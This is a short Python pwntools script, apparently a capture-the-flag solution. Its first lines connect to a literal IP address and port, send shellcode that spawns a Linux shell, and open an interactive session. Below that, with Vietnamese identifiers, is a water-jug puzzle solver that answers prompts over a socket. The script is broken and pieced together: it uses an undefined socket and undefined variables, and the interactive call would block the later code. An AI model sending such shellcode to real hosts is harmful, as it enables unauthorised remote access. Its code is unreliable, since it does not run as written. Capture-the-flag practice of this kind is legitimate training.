from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('125.235.240.166', 11223)
r.send(asm(shellcraft.sh()))
tmp = r.interactive()

def giaithuat(Vx, Vy, luongNuocCanDong):
    binh_x = 0
    binh_y = 0

    z = 0

    result = ''
    print(123)
    while binh_x != luongNuocCanDong and binh_y != luongNuocCanDong:
        if binh_x == Vx:
            binh_x = 0
            result += "1:E_"
        if binh_y == 0:
            binh_y = Vy
            result += "2:F_"
        if binh_y >= 0:
            z = min(binh_y, Vx - binh_x)
            binh_x = binh_x + z
            binh_y = binh_y - z
            result += "2:O_"
    return result[0:-1]


result = giaithuat(a, b, c)
sock.send((result + "\n").encode())
while True:
    data = sock.recv(10240)
    data = sock.recv(10240)
    print(data)
    tmpLine = data.splitlines()
    a = int(tmpLine[3].decode().split(" ")[1])
    b = int(tmpLine[4].decode().split(" ")[1])
    c = int(tmpLine[5].decode().split(" ")[1])
    result = giaithuat(a, b, c)
    r.send(result)
